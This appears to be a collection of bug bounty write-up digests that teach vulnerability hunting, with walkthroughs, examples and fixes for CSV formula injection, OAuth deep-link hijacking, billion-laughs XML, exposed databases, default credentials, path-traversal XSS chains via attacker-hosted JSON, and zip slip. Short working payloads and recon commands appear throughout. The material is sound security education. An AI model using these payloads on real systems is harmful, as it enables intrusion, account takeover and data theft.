title: $15,000 Write-Up: Unauthenticated Temporal on a Yahoo News Cluster
summary_en: Unauthenticated access to a Temporal cluster on Yahoo News allowed for unauthorized interaction with sensitive workflow orchestration, resulting in a $15,000 bounty.

lesson.example: A company uses a tool called Temporal to manage 'User Signups'. They host it at 'https://tasks.target.example'. Vulnerable Code (in a config file): 'auth: { enabled: false }'. Attack Request: 'GET /api/v1/namespaces/default/workflows HTTP/1.1' Host: 'tasks.target.example'. Why: The 'HTTP request' (a digital letter sent to a website) asks for a list of tasks. Because 'enabled' is 'false', the server doesn't check if the sender is an employee. It just sends back the list of all 'workflows' (automated business processes), which might include private user emails or internal logic.

title: $4,800 for an Equals Sign: CSV Formula Injection That Turns an Export Feature Into a Payload…
summary_en: A CSV injection vulnerability in Fieldmark Analytics allowed attackers to execute arbitrary commands on employee laptops by submitting malicious formulas in survey response fields.

lesson.cause: The vulnerability is caused by the application's failure to sanitize user-provided input before including it in a CSV (Comma Separated Values) export. CSV is a plain-text format used to store tabular data, but spreadsheet software like Microsoft Excel interprets any cell starting with an equals sign (=) as a formula. Because the platform allowed survey respondents to submit text starting with these characters, an attacker could inject malicious instructions. When an employee later downloaded and opened the survey results, their spreadsheet software executed the injected commands on their local machine.
lesson.walkthrough:
RECON
1. Identify the target platform, Fieldmark Analytics, which is a survey and feedback-collection service.
2. Observe that the platform allows users to create surveys and collect responses from the public.
3. Note that the platform provides a feature for companies to download these collected responses as CSV files.
DISCOVERY
4. Access a survey form created on the platform as a regular respondent.
5. Identify text input fields where respondents are expected to provide feedback or answers.
6. Test if the application restricts special characters at the beginning of the input.
EXPLOITATION
7. Submit a survey response containing a payload that starts with an equals sign (=).
8. The researcher used a formula designed to trigger command execution.
=
Why: The equals sign is a special character that tells spreadsheet software to stop treating the cell as text and start treating it as a calculation or command. (Formula: A set of instructions in a spreadsheet that performs actions).
9. Submit the form to save the malicious entry into the Fieldmark Analytics database.
10. Wait for an internal employee or a customer of the platform to export the survey data.
11. The victim initiates a CSV export of the survey results.
12. The victim downloads the resulting CSV file to their local computer.
13. The victim opens the CSV file using a spreadsheet application like Microsoft Excel.
IMPACT
14. The spreadsheet application parses the CSV and encounters the cell starting with the equals sign.
15. The application attempts to execute the formula contained within that cell.
16. The formula triggers a system command, leading to arbitrary command execution on the victim's laptop.
17. This results in a Remote Code Execution (RCE) vulnerability.
Why: RCE allows an attacker to run any command they want on a target machine, effectively taking control of it. (RCE: Remote Code Execution, a high-severity security flaw).
18. The researcher reported the finding and received a $4,800 bounty.
lesson.example:
Suppose a website called target.example has a 'Contact Us' form. An attacker submits the following text into the 'Message' field:

=cmd|' /C calc'!A0

When the site administrator exports the messages to a CSV file and opens it in Excel, the spreadsheet sees the '=' and interprets the rest as a command. It uses a feature called DDE (Dynamic Data Exchange) to launch the Windows Command Prompt ('cmd') and open the calculator ('calc'). This works because the website did not check if the message started with a formula-triggering character before saving it to the CSV.
lesson.takeaway: Always test export features (CSV, XLS, PDF) by entering characters like '=', '+', '-', or '@' at the start of input fields. If the exported file evaluates '=1+1' as '2', the application is vulnerable to CSV injection. Look for this pattern in any application that collects user data for administrative review, such as survey tools, CRM systems, or e-commerce order logs. A common beginner mistake is assuming that plain-text formats like CSV are inherently safe; the danger lies in how the software opening the file interprets that text.
lesson.fix:
To fix this, the application must sanitize all user-provided data before it is written to a CSV file. The most effective method is to prepend a single quote (') to any cell value that begins with a formula-triggering character (=, +, -, or @). This tells spreadsheet software to treat the entire cell as literal text and prevents formula execution. 

Example fix in Python:
```python
def sanitize_for_csv(input_string):
    # Define characters that trigger formulas
    trigger_chars = ('=', '+', '-', '@')
    if input_string.startswith(trigger_chars):
        # Prepend a single quote to neutralize the formula
        return "'" + input_string
    return input_string
```

title: Android Deep Link Hijacking to Account Takeover via OAuth Code Interception
summary_en: An attacker can intercept OAuth authorization codes by registering a malicious app with the same custom URI scheme as a legitimate app, leading to full account takeover.

lesson.cause: The vulnerability stems from two main flaws: the use of a non-exclusive custom URI scheme (app-login://) and the storage of sensitive OAuth credentials (client_id and client_secret) inside the publicly accessible APK file (the Android application package). Because Android allows any app to claim a custom URI scheme, a malicious app can 'hijack' the link intended for the real app. Furthermore, because the app's secret keys were hardcoded, the attacker had everything needed to complete the login process once the code was stolen.
lesson.walkthrough:
RECON
1. The researcher decompiles (turning an app file back into readable code) the APK to read the AndroidManifest.xml (a file in an app that lists its features and permissions).
2. They identify an intent-filter (a setting that tells Android which links an app can open) using a custom URI scheme (the part of a link like app:// that tells the device which app to use).
<data android:scheme="app-login" android:host="m.example.com" />
Why: This tells us the app listens for links starting with app-login:// to handle logins.
DISCOVERY
3. The researcher uses JADX (a tool to turn app files into code) to search for the custom scheme and OAuth (a system for sharing data without passwords) secrets.
4. They find a hardcoded client_secret (a password for the app itself) in the Java source code.
private static final String CLIENT_SECRET = "...";
Why: Hardcoded secrets can be read by anyone who downloads the app, as APKs are not encrypted.
EXPLOITATION
5. The researcher creates a malicious PoC (Proof of Concept) app that includes the exact same intent-filter in its own manifest.
6. They install both the legitimate app and the malicious app on the same Android device.
7. The researcher triggers the email verification flow in the legitimate app, which sends a login link to their email.
8. They open the email and click the "Open in App" button.
9. Android displays an app chooser (a menu asking which app to use) because two apps claim the same link.
10. The researcher selects the malicious app from the list.
11. The malicious app receives the intent (a message containing data) which includes the auth_code (a temporary secret used to get a login token).
app-login://m.example.com/?auth_code=...
Why: The sensitive code meant for the real app was successfully diverted to the attacker's app because the scheme was not unique.
12. The malicious app extracts the auth_code using the getQueryParameter method.
String authCode = data.getQueryParameter("auth_code");
Why: This pulls the specific parameter (a piece of information added to a URL) from the intercepted link.
IMPACT
13. The malicious app sends an HTTP POST request (a message sending data to a server) to the token endpoint (a specific web address for authentication).
https://api.example.com/oauth2/token
Why: This exchanges the stolen code and hardcoded secret for an access token (a digital key that proves a user is logged in).
14. The attacker uses the resulting token to request the user's private profile data, proving full account takeover.
https://api.example.com/2.0/users/me
Why: The server believes the attacker is the legitimate user because they provided a valid token.
lesson.example:
Suppose a fictional app 'TargetApp' uses the scheme 'target-auth://' for logins. We assume the app's APK contains a hardcoded secret 'SECRET_999'. An attacker creates 'EvilApp' which also handles 'target-auth://'. When a user clicks a login link like 'target-auth://callback?code=ABC123', they are prompted to choose an app and might pick 'EvilApp'. The attacker's app then sends this request: 

POST /oauth/token HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded

code=ABC123&client_id=target_id&client_secret=SECRET_999

The server sees a valid code and the correct secret, so it issues a login token to the attacker, who now controls the user's account.
lesson.takeaway: When hunting for Android bugs, always check the AndroidManifest.xml for custom URI schemes in intent-filters. Use tools like JADX to decompile the APK and search for hardcoded strings like 'client_secret' or 'api_key'. A common variant of this bug involves 'App Links' that are improperly configured, allowing hijacking even on modern Android versions. Beginners often forget that APKs are not encrypted; any 'secret' stored inside them is public knowledge. Look for OAuth flows where the redirect_uri uses a custom scheme instead of a verified https domain.
lesson.fix: To fix this, developers must use Android App Links with the 'autoVerify=true' attribute in the manifest. This requires hosting a 'digital-asset-links.json' file on the web server to prove the app owns the domain, preventing other apps from hijacking the links. Additionally, sensitive credentials like the client_secret must never be hardcoded in the app. Instead, use the OAuth PKCE (Proof Key for Code Exchange) extension, which uses a dynamically generated secret for each login session, making intercepted codes useless without the session-specific key.

title: My First Blockchain Bug Bounty Investigation: What a Duplicate Report Taught Me About Security…
summary_en: A validation gap in a blockchain node allowed transactions to denylisted addresses to be processed if they were included in a block payload via the Engine API, bypassing standard transaction pool checks.

lesson.cause: The vulnerability was caused by inconsistent security enforcement across different data entry points in the Rust-based blockchain node. While the transaction pool (a digital waiting room for transactions) correctly checked an address denylist (a list of banned addresses), the Engine API (a communication channel for nodes to share blocks) lacked this check in its execution path. Specifically, the function 'execute_transaction_without_commit' processed transactions directly through the EVM (the engine that runs transaction code) without verifying if the recipient was restricted, allowing a malicious block producer to force-include forbidden transactions.
lesson.walkthrough:
RECON
1. The researcher identified the target blockchain node (a computer running the blockchain software) and located the core execution and validation crates (bundles of code in the Rust language).
2. They mapped out the components: 'crates/exec****n-txpool' for incoming transactions and 'crates/e**' for the Engine API.
DISCOVERY
3. They examined the transaction pool logic and found a call to 'is_denylisted()' which prevents forbidden addresses from entering the pool.
4. They then traced the Engine API path, which validators (nodes that verify new blocks) use to accept blocks from other nodes.
5. They located the execution function:
execute_transaction_without_commit()
Why: This function is responsible for simulating or running transactions within a block without making the changes permanent yet.
6. They observed that this function calls the EVM (Ethereum Virtual Machine, the virtual engine that executes instructions) directly:
self.evm.transact(tx_env)
Why: The researcher noted that no denylist check occurred before this call, meaning the 'brain' of the node would process whatever it was given.
EXPLOITATION
7. To prove the gap, they set up a local test environment with two nodes: a Producer and a Validator.
8. They configured a specific address as 'denylisted' in the node settings.
9. They used the Producer node to craft a transaction targeting that blocked address.
10. They generated an 'execution payload' (a package of data containing the block's transactions).
11. They sent this payload to the Validator node using the Engine API.
12. They monitored the Validator's response to see if it would reject the block due to the banned address.
IMPACT
13. The Validator accepted the payload and returned a 'Valid' status.
14. The researcher confirmed the transaction was processed by checking the transaction receipt (a digital proof that a transaction was completed).
15. This proved that a malicious block proposer could bypass the denylist for the entire network, rendering the security feature useless against sophisticated attackers.
lesson.example: Imagine a digital library (target.example) that has a 'Public Upload' page and a 'Librarian Sync' tool. The Public Upload page has a filter that blocks files containing 'malware.exe'. However, the Librarian Sync tool, which downloads books from other libraries, forgets to check for 'malware.exe'. An attacker sets up a fake library, puts 'malware.exe' in a book, and uses the Sync tool to push it to the target. The target accepts it because it trusts the Sync tool more than the Public page. In code, the Public page calls 'check_file(file)', but the Sync tool calls 'save_to_disk(file)' directly. To exploit this, you would find the internal sync endpoint and send a POST request (a message sent to a server to submit data) with the forbidden file: 'POST /api/sync/receive { "file_name": "malware.exe", "content": "..." }'. The server processes it because the 'Sync' logic assumes the data is already clean.
lesson.takeaway: Always look for 'secondary' data entry points that might bypass 'primary' filters. In blockchain, this often means comparing the Transaction Pool (user-facing) with the Engine API (node-to-node). If you find a security check in one, verify it exists in the other. Use search terms like 'validate', 'check', or 'denylist' across the whole codebase to see where they are missing. A common mistake is assuming that because data comes from a 'peer' or 'internal' source, it is already validated; this is known as the Byzantine threat model where you must never trust data from another node.

title: One File, Zero Clicks Needed: A Stored DoS Story
summary_en: A researcher discovered that a diagramming tool's SVG upload feature was vulnerable to a 'Billion Laughs' XML expansion attack, allowing a low-privilege user to permanently crash diagrams for all collaborators.

lesson.cause: The vulnerability was caused by the server-side XML parser failing to disable entity expansion when processing SVG files. Since SVGs are XML-based, they support 'entities' (text shortcuts). The application's parser would dutifully attempt to expand these shortcuts even when they were nested exponentially, leading to a Denial of Service (DoS) as the server exhausted its memory and CPU resources trying to resolve a tiny file into gigabytes of data.
lesson.walkthrough:
RECON
1. The researcher identified a diagramming tool with a feature allowing users to upload custom shape libraries as SVG files.
(An SVG is an image format that uses XML text to define shapes).

DISCOVERY
2. The researcher noted that SVGs are essentially XML files, which are often susceptible to entity-based attacks.
(XML is a language used to store and transport data).
3. They decided to test for a 'Billion Laughs' attack, which uses nested shortcuts to overwhelm a computer.
(An entity is a shortcut in XML that represents a larger string of text).

EXPLOITATION
4. The researcher prepared a malicious SVG file containing the 'Billion Laughs' XML structure.
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<svg>&lol2;</svg>
Why: This payload defines 'lol1' as ten 'lol's, and 'lol2' as ten 'lol1's. Each level multiplies the size by 10. A full version with 9 levels results in 1 billion 'lol's from a tiny file.
5. The researcher uploaded this SVG into the 'custom shape library' section of a diagram.
6. They dragged the malicious shape onto the active drawing canvas.
7. The application immediately became unresponsive, showing a permanent loading state.
Why: The server's parser (the software reading the file) got stuck in an infinite loop of expanding the shortcuts, consuming all available resources.

IMPACT
8. To confirm the 'Stored' nature of the bug, the researcher logged in as a different user (the high-privilege owner of the diagram).
9. The owner attempted to open the diagram that the collaborator had modified.
10. The owner's screen also hung indefinitely, effectively locking them out of their own work.
Why: Because the malicious SVG was saved as part of the diagram's state, the server tried to process it for every single user who viewed that diagram.
lesson.example:
Imagine a project management app at target.example where users can upload SVG icons for their tasks. An attacker uploads 'bomb.svg' containing nested entities. 

Attack Request:
POST /api/tasks/101/icon HTTP/1.1
Content-Type: image/svg+xml

<svg>
<!DOCTYPE bomb [
<!ENTITY a "RESOURCES">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<rect width="100" height="100">&c;</rect>
</svg>

When any team member views the task list, their browser or the server (depending on where the SVG is processed) will attempt to expand '&c;' into 100 instances of 'RESOURCES'. If the attacker adds more levels (d, e, f...), the expansion reaches billions of characters, crashing the app for the entire team.
lesson.takeaway: When hunting for bugs, always treat SVG upload fields as XML entry points. Test for both XXE (reading files) and XML Entity Expansion (crashing the server). This 'Stored DoS' pattern is particularly valuable because it proves you can disrupt other users' workflows without their interaction. Look for any app that processes XML-based formats like SVG, DOCX, or XLSX. A common mistake is thinking that 'image' uploads are safe; if the file is text-based like an SVG, it is a potential logic bomb.
lesson.fix: The fix is to configure the XML parser to explicitly disable Document Type Definitions (DTDs) and external entity resolution. In most programming languages, this is done by setting specific security flags on the parser object. For example, in Java using the DocumentBuilderFactory, you should set 'setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)'. This prevents the parser from even looking at the malicious entity definitions, neutralizing the attack before it starts.

title: Recreating the DeepSeek Database Leak Wiz Research Found
summary_en: A publicly exposed ClickHouse database and misconfigured staging environments at DeepSeek leaked sensitive chat logs, internal API keys, and cloud infrastructure credentials.

lesson.cause: The primary cause was the exposure of a production database port (9000) to the public internet without any authentication (a password-free login). Additionally, developers hardcoded sensitive cloud credentials into client-side JavaScript files and failed to implement access controls on a staging dashboard, allowing guest access to internal inventory and pricing data.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher performed passive subdomain enumeration to find all web addresses associated with the target.
`subfinder -d target.com`
Why: To find hidden parts of the infrastructure (subdomain: a prefix to a main website name like 'blog.example.com').
2. The list of subdomains was resolved to see which ones were currently active.
`cat subdomains.txt | httpx -sc -title`
Why: To check the HTTP status code (a 3-digit number from a server telling you if a request worked) and page titles.
3. The researcher identified 'deepleak' as a high-interest target due to its name and redirect behavior.
`curl -I http://deepleak.target.com`
Why: To confirm the target's purpose via HTTP headers (metadata sent with a web request).

PORT DISCOVERY
4. A full port sweep was performed on the 'deepleak' host to find non-standard services.
`nmap -p- deepleak.target.com`
Why: To find open ports (a virtual 'door' on a server where specific services live).
5. The open ports were probed to identify the specific services running on them.
`httpx -p 80,443,8080,9000 -sc -title`
Why: To see if the ports hosted web interfaces or database management tools.

EXPLOITATION (PATH 1 - JS LEAK)
6. The researcher accessed the cluster management portal on port 8080.
`http://deepleak.target.com:8080`
Why: To investigate the management interface for potential vulnerabilities.
7. The researcher inspected the JavaScript bundle loaded by the portal.
`GET /static/js/main.chunk.js`
Why: To look for secrets in the JavaScript bundle (a file containing all the code needed to run a website's interactive parts).
8. Hardcoded AKS credentials and bearer tokens were found inside the code.
`const AKS_TOKEN = "eyJhbGci..."`
Why: Developers accidentally included credentials (keys used to prove identity) in the public code.

EXPLOITATION (PATH 2 - STAGING BYPASS)
9. A router resellers portal was discovered on a nearby staging environment.
`http://staging-router.target.com`
Why: To check if internal tools were properly protected.
10. The researcher accessed the dashboard as a guest with no login required.
`GET /dashboard/inventory`
Why: The application lacked authentication (the process of verifying who a user is) for sensitive endpoints.

EXPLOITATION (PATH 3 - DATABASE LEAK)
11. The researcher navigated to the ClickHouse web interface on port 9000.
`http://deepleak.target.com:9000`
Why: To see if the database was unauthenticated (accessible without a password).
12. A query was sent to list all available databases on the server.
`SHOW DATABASES`
Why: To identify where sensitive data might be stored using a query (a specific command sent to a database).
13. The researcher targeted the 'deepleak' database and its 'log_stream' table.
`SELECT * FROM deepleak.log_stream LIMIT 10`
Why: To verify if the table contained real sensitive information.
14. The final dump revealed API keys, database connection strings, and chat logs.
`SELECT * FROM deepleak.log_stream`
Why: To prove the impact of the leak, which included API keys (secret passwords for software) and JWT tokens (digital ID cards).
lesson.example: Imagine a company called 'cloud-storage.example' that uses a database called Redis to store temporary user sessions. They accidentally leave port 6379 open to the internet. A researcher finds this by scanning the IP address: 'nmap -p 6379 192.0.2.1'. By using a simple tool called 'redis-cli', the researcher connects without a password: 'redis-cli -h 192.0.2.1'. They run the command 'KEYS *' and see thousands of session tokens. By running 'GET session:user123', they retrieve a user's private login token, allowing them to take over the account. This works because the database was configured to trust any connection from any location by default.
lesson.takeaway: Always scan the full range of 65,535 ports, not just 80 and 443, as databases often live on high ports like 9000 (ClickHouse), 6379 (Redis), or 27017 (MongoDB). Use tools like 'httpx' with the '-title' flag to quickly identify database web UIs that shouldn't be public. A common mistake is assuming that 'security by obscurity' (using a weird port) is enough; if a port is open, it will be found. Look for variants like exposed Prometheus metrics or Spring Boot Actuator endpoints which often leak similar environment secrets.
lesson.fix:
To fix these issues, first implement a strict firewall policy (such as AWS Security Groups or iptables) that blocks all database ports from the public internet, allowing access only from trusted internal IP addresses. Second, enable strong authentication on the ClickHouse instance by creating users with complex passwords in the 'users.xml' configuration. Third, remove all hardcoded secrets from frontend code and use a secrets management service (like HashiCorp Vault or Azure Key Vault) to inject credentials at runtime. Finally, ensure all staging and internal environments require SSO (Single Sign-On) authentication before any data is displayed.

Example ClickHouse fix (users.xml):
<users>
  <admin>
    <password_sha256_hex>your_secure_hash_here</password_sha256_hex>
    <networks>
      <ip>10.0.0.0/8</ip>
    </networks>
  </admin>
</users>

title: Finding an Exposed Admin Panel on a Government Portal: A Responsible Disclosure Story
summary_en: A government portal's administrative panel was found exposed to the public internet, protected only by default vendor credentials and lacking rate limiting. This allowed for immediate unauthorized access to the site's management interface.

lesson.cause: The vulnerability was caused by a failure to change default vendor credentials (standard passwords set by the software creator) after the portal was deployed. Additionally, the admin panel (a restricted area for site management) was publicly accessible without any IP allowlisting (restricting access to specific trusted computers). The absence of rate limiting (a mechanism that limits how many times a user can try to log in) further exacerbated the risk, making the panel vulnerable to automated guessing attacks. Finally, a lack of a security handoff checklist between the third-party developer and the government agency meant these basic security steps were overlooked.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher performed passive reconnaissance (gathering information about a target without directly attacking it) using search engine dorking (using advanced search commands to find hidden information).
2. The researcher used directory enumeration (automatically testing common folder names like /admin or /login) to find hidden paths on the government website.

DISCOVERY
3. The researcher discovered an administrative login panel (a private page used to manage the website) that was directly reachable from the homepage.
4. The researcher identified that the portal was built by a third-party vendor, which often uses standard settings.

EXPLOITATION
5. The researcher attempted to log in using default credentials (standard usernames and passwords like 'admin' or 'password' provided by the software manufacturer).
6. The researcher observed that the login form had no rate limiting (a security feature that blocks a user after too many failed attempts).
7. The researcher successfully confirmed that the default credentials worked, granting access to the administrative backend.

IMPACT
8. The researcher confirmed that an attacker could have viewed, modified, or deleted sensitive government data or taken full control of the portal.
9. The researcher immediately stopped testing once access was confirmed to follow ethical disclosure guidelines.
lesson.example:
Imagine a fictional website called target.example that uses a popular management software called 'WebAdmin v1'. By searching the internet, an attacker finds the manual for 'WebAdmin v1' which states the default username is 'manager' and the password is '12345'.

The attacker navigates to:
http://target.example/admin_login.php

They enter the credentials into the HTTP request (the message sent from the browser to the server):
POST /admin_login.php HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded

username=manager&password=12345

Because the owner of target.example never changed the default password, the server responds with a '200 OK' and a session cookie (a small piece of data that keeps the user logged in), giving the attacker full control over the site.
lesson.takeaway: Always check for default credentials on any third-party software or login panels you discover during reconnaissance. Look for 'Powered by' footers or unique page titles to identify the software vendor, then search for their default manuals online. A key signal is the lack of rate limiting; if you can try 100 passwords without being blocked, the system is highly vulnerable. A common beginner mistake is assuming that because a link isn't visible on the homepage, it is 'secure'—always use directory brute-forcing tools to find hidden administrative endpoints.

title: From CSPT to DOM XSS: Chaining an Open Redirect with Malicious JSON
summary_en: A client-side path traversal (CSPT) vulnerability allowed an attacker to manipulate an API request URL, redirecting it to a malicious server to inject a script into the page via DOM XSS.

lesson.cause: The application takes a user-provided ID from the URL and appends it directly to an API path without sanitization. This allows path traversal (using ../ to change the folder). The application then takes the resulting data and puts it into the page using innerHTML, which doesn't block malicious code.
lesson.walkthrough: RECON 1. The researcher visits the profile page to see how it loads data. URL: https://target.example/profile?id=123 Why: To identify how the id parameter (a piece of data in the URL) affects the page. DISCOVERY 2. The researcher inspects the site's code to find how the id is used. const id = new URLSearchParams(location.search).get("id"); Why: The code uses URLSearchParams (a tool to read URL data) to grab the id from location.search (the part of the URL after the question mark). 3. The researcher finds where the id is sent to the server. fetch(`/api/user/${id}`) Why: The fetch command (a request for data) builds a web address by sticking the id directly onto the end of the API path. 4. The researcher looks for how the server's response is handled. .then(user => { displayUser(user); }) Why: The app takes the user data from the server and passes it to a function to show it on the screen. 5. The researcher checks the displayUser function for dangerous code. element.innerHTML = user.name; Why: The app uses innerHTML (a tool that turns text into live HTML) which is dangerous because it executes any code found in the text. EXPLOITATION 6. The researcher tests if they can change the folder the app looks in. ?id=../test Why: By using path traversal (using ../ to move up a folder), the researcher tries to make the app request a different endpoint (server address). 7. The researcher finds an Open Redirect (a bug that sends users to any site) on the same server. /api/redirect?url=https://attacker.com Why: This allows the researcher to point the app's data request to a server they control. 8. The researcher creates a malicious JSON (a data format) file on their own server. {"name": ""} Why: This payload (malicious code) uses an image tag that fails to load, triggering a script to run. 9. The researcher combines the traversal and the redirect into a single id value. ?id=../../redirect?url=https://attacker.com/malicious.json Why: This forces the fetch command to go up two folders, hit the redirector, and load the attacker's file. 10. The researcher sends the final link to a victim. https://target.example/profile?id=../../redirect?url=https://attacker.com/malicious.json Why: When the victim clicks, their browser performs the malicious request automatically. IMPACT 11. The browser receives the attacker's JSON data. {"name": ""} Why: The browser thinks this is legitimate user data from the app's own server. 12. The application injects the malicious name into the page. element.innerHTML = ""; Why: Because innerHTML was used, the browser sees the script and runs it, completing the XSS (Cross-Site Scripting) attack.
lesson.example: A fictional site target.example uses a script to load user bios: const bioId = new URLSearchParams(window.location.search).get('bioId'); fetch('/api/bios/' + bioId).then(r => r.json()).then(data => { document.getElementById('bio-box').innerHTML = data.content; }); An attacker finds an open redirect at /api/go?to=EXTERNAL_URL. They host a file at https://evil.com/xss.json containing {"content": "<script>alert('Hacked')</script>"}. By tricking a user into visiting https://target.example/profile?bioId=../../go?to=https://evil.com/xss.json, the fetch call is diverted to the attacker's server. The browser receives the script and, because the site uses innerHTML, it executes the alert.
lesson.takeaway: Look for fetch() or XMLHttpRequest where the URL is built using user input. Check if the site has an open redirect that can be reached via ../ traversal. Always check how the JSON response is rendered; if you see .innerHTML, .outerHTML, or $().html(), it is a prime target for XSS. A common mistake is assuming that because the data comes from an API, it is safe to trust. Variants include using this to bypass Content Security Policy (CSP) by loading scripts from a trusted domain's redirector.

title: How I Got Unlimited Office 365 Premium Memberships & Unlimited LinkedIn Premium Vouchers
summary_en: A logic flaw in Microsoft's signup flow allowed users to bypass account limits by using email sub-addressing (plus tagging). This enabled the creation of unlimited free Office 365 and LinkedIn Premium accounts from a single email inbox.

lesson.cause: The root cause was a failure to perform canonicalization (converting data into its simplest, standard form) on email addresses before enforcing business rules. The system treated 'test+1@redacted.edu' and 'test+2@redacted.edu' as two different people because it compared the raw text strings. However, most email providers use sub-addressing, where any text after a plus sign is ignored for delivery. This allowed a single attacker to create infinite identities that all pointed back to one controlled inbox, bypassing the intended 'one trial per user' limit.
lesson.walkthrough:
RECON
1. Navigate to the Microsoft 365 Education signup portal.
URL: https://www.microsoft.com/en-us/education/products/office
Why: To identify the specific web page (Endpoint: a specific web address on a server) where users register for free trials.
2. Identify the requirement for a .edu email address.
Why: To understand the prerequisite (Requirement: a condition that must be met first) for the attack.
DISCOVERY
3. Enter a valid university email address into the registration form.
Email: test@redacted.edu
Why: To trigger an HTTP request (A message sent from your computer to a server asking for data) and observe a normal signup.
4. Receive and click the verification link in the inbox.
Why: To complete the authentication (Authentication: the process of proving you are who you say you are) process.
5. Confirm the 12-month subscription is active.
EXPLOITATION
6. Open a new private browser window to clear session data.
Why: To ensure the website doesn't recognize the previous login session (Cookie: a small file used by websites to remember you).
7. Start a new registration using a 'plus tag' in the email field.
Email: test+1@redacted.edu
Why: To send a malicious payload (The specific data or trick code sent to exploit a bug) inside the email parameter (A specific piece of information sent inside a request).
8. Monitor the original inbox for a new verification email.
Why: To verify the email provider supports sub-addressing (Sub-addressing: a feature where tags added to an email are ignored during delivery).
9. Click the second verification link.
Why: To bypass the 'one account per person' rule using a modified email string (String: a sequence of characters like letters or numbers).
10. Repeat the process with a third variation.
Email: test+2@redacted.edu
Why: To demonstrate that the vulnerability allows for unlimited account creation.
IMPACT
11. Access the Microsoft Store dashboard for the new accounts.
Why: To check for additional rewards or services granted to new users.
12. Confirm the receipt of a LinkedIn Premium voucher.
Why: To show how one bug affects multiple services (Entitlement: a digital right or permission to use a service).
lesson.example: A fictional target 'coupon-king.example' offers a $10 discount to new subscribers. The vulnerable code checks if an email exists in the database: 'if (db.exists(email_input)) return error;'. An attacker uses 'shopper+1@example.com', 'shopper+2@example.com', and so on. The attack request: 'POST /api/claim-discount {"email": "shopper+deal1@example.com"}'. Because the database stores the full string including the plus tag, it treats each variation as a new customer. However, the email server delivers all discount codes to the same 'shopper@example.com' inbox, allowing the attacker to collect hundreds of coupons.
lesson.takeaway: Always test for email variations when a system enforces 'one-per-user' limits or rate limits. Look for sub-addressing (using '+'), dot-stuffing (using 'u.s.e.r@gmail.com'), or case sensitivity (using 'User@example.com'). Use tools like Burp Suite Intruder to automate the creation of hundreds of variations to see if the system blocks them. A common beginner mistake is assuming that because a string is unique in a database, it represents a unique human identity. Variants of this bug often appear in newsletter signups, referral programs, and password reset rate limits.
lesson.fix:
Developers must normalize email addresses before checking them against a database or rate limiter. This involves converting the string to lowercase and removing any sub-addressing tags. For example, in Python, you can use 'email.split("+")[0]' to get the base username before the domain. Always store and compare the 'canonical' version of the email to ensure one identity equals one record.

```python
def get_clean_email(raw_email):
    raw_email = raw_email.lower()
    user, domain = raw_email.split("@")
    clean_user = user.split("+")[0]
    return f"{clean_user}@{domain}"
```

title: $13,000 for a Filename Inside a Zip: Path Traversal During Archive Extraction to RCE
summary_en: A document management platform was vulnerable to Remote Code Execution (RCE) because it trusted filenames inside uploaded ZIP archives, allowing attackers to write files anywhere on the server.

lesson.cause: The vulnerability stems from the application's trust in the internal structure of a ZIP archive (a compressed file containing multiple other files). When the server extracts the ZIP, it uses the 'os.path.join' function to combine a safe destination folder with the filenames found inside the archive. Because the application does not check if these filenames contain 'dot-dot-slash' (../) sequences, an attacker can name a file in a way that forces the server to save it outside the intended directory. This implementation flaw allows an attacker to overwrite system files or upload malicious scripts to web-accessible folders.
lesson.walkthrough:
RECON
1. The researcher identifies that the target platform, Cascade Ledger, allows users to perform bulk uploads of documents using ZIP archives.
(No code provided in article)
Why: ZIP archives (compressed files that bundle multiple items) are often processed automatically by servers, making them a prime target for testing how the server handles file paths.
DISCOVERY
2. The researcher analyzes how the server likely processes the files inside the ZIP archive.
`for entry in zipfile.namelist():` 
Why: The server uses a loop to look at every filename (entry) stored inside the uploaded ZIP file. (A loop is a way to repeat an action for every item in a list).
EXPLOITATION
3. The researcher creates a malicious ZIP file where one of the internal filenames contains path traversal characters.
`../../../` 
Why: Path Traversal (using '../' to move up one folder level) allows the attacker to escape the 'sandbox' (a restricted folder where files are supposed to stay).
4. The server attempts to calculate where to save the file by joining the extraction folder with the malicious filename.
`output_path = os.path.join(extract_dir, entry)` 
Why: The 'os.path.join' tool (a function used to glue folder names together) does not automatically stop '../' from navigating out of the base folder.
5. The server opens a file at the calculated (and now malicious) path and writes the contents of the ZIP entry into it.
`with open(output_path, 'wb') as f: f.write(zipfile.read(entry))` 
Why: By writing a file to a sensitive location, the attacker can achieve Remote Code Execution (RCE), which means they can run their own commands on the server.
lesson.example: On a fictional site called target.example, there is a feature to upload 'Website Themes' as a ZIP file. The server is supposed to extract these themes to `/var/www/themes/`. An attacker creates a ZIP file containing a file named `../../html/shell.php`. When the server processes this, it calculates the path as `/var/www/themes/../../html/shell.php`. The computer simplifies this to `/var/www/html/shell.php`. Because the attacker has now placed a PHP script in the public web folder, they can visit `target.example/shell.php` to take control of the server.
lesson.takeaway: Always test features that handle compressed archives (ZIP, TAR, etc.) for Path Traversal by including '../' in the filenames of the archived files. Look for 'Import', 'Bulk Upload', or 'Restore Backup' buttons as these are common entry points for this bug. A key signal is when an application extracts files and you can guess or find where they are stored on the server. A common variant is the 'Zip Slip' vulnerability, which affects many different programming languages and libraries. A common beginner mistake is assuming that standard library functions like 'join' will automatically sanitize paths for security.
lesson.fix:
To fix this vulnerability, you must validate that the final destination path is still located within the intended extraction directory. This is done by resolving the 'absolute path' (the full, simplified address) of both the directory and the file, then checking if the file path starts with the directory path. 

```python
import os
def safe_extract(extract_dir, entry):
    # Get the full, real path of the destination
    base = os.path.abspath(extract_dir)
    target = os.path.abspath(os.path.join(base, entry))
    # Ensure the target is actually inside the base folder
    if not target.startswith(base):
        raise Exception('Unsafe path detected!')
    # Proceed with extraction safely...
```

title: How a Campaign Name Became a No-Click Data Exfiltration Primitive: A Deep Dive into CSV Formula…
